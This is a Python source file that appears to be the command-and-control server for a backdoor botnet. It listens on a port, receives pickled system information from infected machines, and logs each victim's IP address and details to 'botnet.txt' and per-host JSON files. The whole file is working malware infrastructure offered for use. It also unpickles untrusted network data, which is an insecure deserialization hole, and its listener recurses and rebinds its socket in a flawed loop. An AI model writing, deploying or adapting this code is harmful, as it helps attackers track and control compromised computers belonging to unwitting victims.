import socket
import json
import pickle
from datetime import datetime

class Handler(): 

    def __init__(self): 
        self.HOST = '0.0.0.0' ## IP ADDRESS OF YOUR HOST MACHINE (127.0.0.1 If backdoor and C2 is run on same machine.)
        self.PORT = 9999    
        self.sock = None 
        self.BUFFER_SIZE = 1024 * 128


    def connection_logger(self, ipaddr):
        try: 
            now = datetime.now() 
            current_time = now.strftime("%H:%M:%S")
            with open("connections/connectionlist.txt", "a") as f: 
                f.writelines(f"[{current_time}]:NEW CONNECTION ---> {ipaddr}" + '\n') 

        except FileNotFoundError: 
            with open("connections/connectionlist.txt", "x") as f: 
                f.writelines(f"[{current_time}]:NEW CONNECTION ---> {ipaddr}" + '\n') 
        
    def savefunc(self, ipaddr, pickled_array): 
        try:  
            with open("connections/botnet.txt", "r+") as f: 
                    f.writelines(ipaddr + '\n') 

        except FileNotFoundError: 
            with open("connections/botnet.txt", "x") as f: 
                f.writelines(ipaddr + "\n") 

        try: 
            with open(f"database/{ipaddr}_SYSINFO.json", "r+") as f:
                json.dump(pickled_array, f) 

        except FileNotFoundError as e: 
            with open(f"database/{ipaddr}_SYSINFO.json", "x") as f: 
                json.dump(pickled_array, f) 

        self.connection_logger(ipaddr)  

    def listener(self): 
        while True: 
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
            self.sock.bind((self.HOST, self.PORT))
            self.sock.listen() 
            conn, addr = self.sock.accept() 

            sysinfo = conn.recv(self.BUFFER_SIZE) 

            pickled_jsondata = pickle.loads(sysinfo) 
            jdata = json.loads(pickled_jsondata)
            conn.close()
            
            addr = str(addr).split(",") 
            addr.pop(1) 
            santize = ['[', ']', '(', ')', '"', "'"] 
            for i in santize: 
                addr = str(addr).replace(i, '') 

            self.savefunc(addr, jdata)
            
            self.listener()
                
                

        

           

 

